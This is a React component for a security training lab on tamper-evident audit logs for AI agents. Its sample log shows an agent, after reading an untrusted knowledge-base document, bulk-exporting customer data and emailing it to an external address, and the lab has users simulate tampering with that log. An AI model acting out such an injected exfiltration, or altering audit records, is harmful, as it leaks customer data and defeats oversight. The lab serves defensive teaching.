"use client";

import { useEffect, useState } from "react";
import { Anchor, Flag, Link2, RefreshCw, ShieldCheck } from "lucide-react";
import { useApp } from "@/lib/store";
import { Badge, Card, GradientButton } from "./ui";

type Entry = { ts: string; actor: string; event: string; detail: string; decision: string };

const BASE: Entry[] = [
  { ts: "09:14:02", actor: "agent:support-ops#r-77", event: "task.start", detail: "on-behalf-of user:dana — 'answer refund question for C-1001'", decision: "-" },
  { ts: "09:14:03", actor: "agent:support-ops#r-77", event: "llm.call", detail: "model=llama-3.3-70b tokens=812", decision: "-" },
  { ts: "09:14:04", actor: "agent:support-ops#r-77", event: "tool.call", detail: "search_docs(query='refund policy')", decision: "ALLOW" },
  { ts: "09:14:04", actor: "agent:support-ops#r-77", event: "taint", detail: "community doc KB-3 entered context", decision: "-" },
  { ts: "09:14:06", actor: "agent:support-ops#r-77", event: "tool.call", detail: "read_customer(id='C-1001')", decision: "ALLOW" },
  { ts: "09:14:07", actor: "agent:support-ops#r-77", event: "tool.call", detail: "export_customers(format='json')", decision: "ALLOW" },
  { ts: "09:14:08", actor: "agent:support-ops#r-77", event: "tool.call", detail: "send_email(to='audit@external-audit.io', subject='export', body=<4.2KB>)", decision: "ALLOW" },
  { ts: "09:14:09", actor: "agent:support-ops#r-77", event: "llm.call", detail: "model=llama-3.3-70b tokens=1033", decision: "-" },
  { ts: "09:14:10", actor: "agent:support-ops#r-77", event: "guard.output", detail: "clean", decision: "-" },
  { ts: "09:14:10", actor: "agent:support-ops#r-77", event: "task.end", detail: "answered user; 4 tool calls", decision: "-" },
];
const SUSPICIOUS = 6;

async function sha256(s: string) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(s));
  return Array.from(new Uint8Array(buf), (b) => b.toString(16).padStart(2, "0")).join("");
}
const serialize = (e: Entry) => `${e.ts}|${e.actor}|${e.event}|${e.detail}|${e.decision}`;
async function chain(entries: Entry[]) {
  const out: string[] = [];
  let prev = "GENESIS";
  for (const e of entries) {
    prev = await sha256(`${prev}|${serialize(e)}`);
    out.push(prev);
  }
  return out;
}

export function AuditLab({ gradient }: { gradient: string; accent: string }) {
  const { completeLab, askAssistant } = useApp();
  const [entries, setEntries] = useState<Entry[]>(BASE);
  const [stored, setStored] = useState<string[]>([]);
  const [anchor, setAnchor] = useState("");
  const [verify, setVerify] = useState<{ brokenAt: number | null; anchorOk: boolean } | null>(null);
  const [flagged, setFlagged] = useState<number | null>(null);
  const [detected, setDetected] = useState(false);
  const [editing, setEditing] = useState<number | null>(null);

  useEffect(() => {
    chain(BASE).then((h) => {
      setStored(h);
      setAnchor(h[h.length - 1]);
    });
  }, []);

  useEffect(() => {
    if (flagged === SUSPICIOUS && detected) completeLab("audit-forensics");
  }, [flagged, detected, completeLab]);

  const runVerify = async () => {
    let prev = "GENESIS";
    let brokenAt: number | null = null;
    for (let i = 0; i < entries.length; i++) {
      const h = await sha256(`${prev}|${serialize(entries[i])}`);
      if (h !== stored[i] && brokenAt === null) brokenAt = i;
      prev = stored[i];
    }
    const anchorOk = stored[stored.length - 1] === anchor;
    setVerify({ brokenAt, anchorOk });
    if (brokenAt !== null || !anchorOk) setDetected(true);
  };

  const attackerRehash = async () => {
    setStored(await chain(entries));
    setVerify(null);
  };

  const reset = async () => {
    setEntries(BASE);
    setStored(await chain(BASE));
    setVerify(null);
    setEditing(null);
  };

  return (
    <div className="space-y-4">
      <p className="rounded-xl bg-white/[0.04] p-3 text-xs text-slate-300">
        🎯 <b>Goal:</b> (1) 🚩 flag the event where data was exfiltrated. (2) Play the attacker: edit that entry to cover your tracks, then verify — the hash chain catches you. (3) Try
        &quot;attacker re-hashes everything&quot; and see why the head hash must be <b>anchored</b> (signed / WORM / published).
      </p>

      <Card
        title="Agent audit log · run r-77"
        right={
          <span className="flex items-center gap-1 text-[10px] text-slate-500">
            <Anchor size={12} /> anchored head: <code className="text-sky-300">{anchor.slice(0, 12)}…</code>
          </span>
        }
      >
        <div className="scroll-thin overflow-x-auto">
          <table className="w-full min-w-[560px] text-[11px]">
            <thead>
              <tr className="text-left text-slate-500">
                <th className="p-1">#</th>
                <th className="p-1">time</th>
                <th className="p-1">event</th>
                <th className="p-1">detail</th>
                <th className="p-1">decision</th>
                <th className="p-1">hash</th>
                <th className="p-1" />
              </tr>
            </thead>
            <tbody>
              {entries.map((e, i) => {
                const broken = verify?.brokenAt !== null && verify?.brokenAt !== undefined && i >= verify.brokenAt;
                return (
                  <tr key={i} className={`border-t border-white/5 ${flagged === i ? (i === SUSPICIOUS ? "bg-emerald-500/15" : "bg-amber-500/10") : ""} ${broken ? "bg-rose-500/15" : ""}`}>
                    <td className="p-1 text-slate-500">{i}</td>
                    <td className="p-1 font-mono text-slate-500">{e.ts}</td>
                    <td className="p-1 font-mono text-sky-300">{e.event}</td>
                    <td className="p-1">
                      {editing === i ? (
                        <input
                          autoFocus
                          value={e.detail}
                          onChange={(ev) => setEntries(entries.map((x, j) => (j === i ? { ...x, detail: ev.target.value } : x)))}
                          onBlur={() => setEditing(null)}
                          className="w-full rounded border border-rose-400/50 bg-black/40 px-1 font-mono"
                        />
                      ) : (
                        <button onClick={() => setEditing(i)} title="Click to tamper" className="text-left font-mono text-slate-300 hover:text-rose-300">
                          {e.detail}
                        </button>
                      )}
                    </td>
                    <td className="p-1">{e.decision !== "-" && <Badge kind={e.decision}>{e.decision}</Badge>}</td>
                    <td className="p-1 font-mono text-[10px] text-slate-600">{stored[i]?.slice(0, 8)}</td>
                    <td className="p-1">
                      <button onClick={() => setFlagged(i)} aria-label="Flag" className={flagged === i ? "text-rose-400" : "text-slate-600 hover:text-rose-300"}>
                        <Flag size={12} />
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
        {flagged !== null && (
          <p className={`mt-2 text-xs ${flagged === SUSPICIOUS ? "text-emerald-300" : "text-amber-300"}`}>
            {flagged === SUSPICIOUS
              ? "✅ Correct! Untrusted KB-3 tainted the context (#3), then a bulk export (#5) was emailed to an external domain (#6) — the Lethal Trifecta in action. A taint rule would have denied it."
              : "🤔 Not quite — look for sensitive data leaving the organisation after untrusted content was read."}
          </p>
        )}
      </Card>

      <div className="grid gap-2 sm:grid-cols-3">
        <GradientButton gradient={gradient} onClick={runVerify}>
          <ShieldCheck size={16} /> Verify integrity
        </GradientButton>
        <button onClick={attackerRehash} className="flex items-center justify-center gap-2 rounded-xl bg-rose-500/20 px-3 py-2 text-sm font-semibold text-rose-200 hover:bg-rose-500/30">
          <Link2 size={16} /> Attacker re-hashes chain
        </button>
        <button onClick={reset} className="flex items-center justify-center gap-2 rounded-xl bg-white/5 px-3 py-2 text-sm hover:bg-white/10">
          <RefreshCw size={16} /> Reset log
        </button>
      </div>

      {verify && (
        <Card>
          {verify.brokenAt === null && verify.anchorOk ? (
            <p className="text-sm font-semibold text-emerald-300">✅ Chain intact and head matches the anchor. Log is trustworthy.</p>
          ) : (
            <div className="space-y-1 text-sm">
              {verify.brokenAt !== null && <p className="font-semibold text-rose-300">⛔ Hash mismatch at entry #{verify.brokenAt} — everything after it is untrusted.</p>}
              {!verify.anchorOk && (
                <p className="font-semibold text-rose-300">
                  ⛔ Chain head ≠ anchored head. The internal chain {verify.brokenAt === null ? "looks consistent (attacker re-hashed it!)" : "is broken"}, but the externally anchored hash exposes the tampering.
                </p>
              )}
            </div>
          )}
          <button
            onClick={() => askAssistant("Design a production-grade tamper-evident audit logging pipeline for AI agents (OpenTelemetry, hash chaining, signing, WORM storage, SIEM alerts). Include detection rules for exfiltration sequences.")}
            className="mt-2 rounded-lg bg-violet-500/20 px-3 py-1.5 text-xs text-violet-200 hover:bg-violet-500/30"
          >
            🤖 Design this for production
          </button>
        </Card>
      )}
    </div>
  );
}
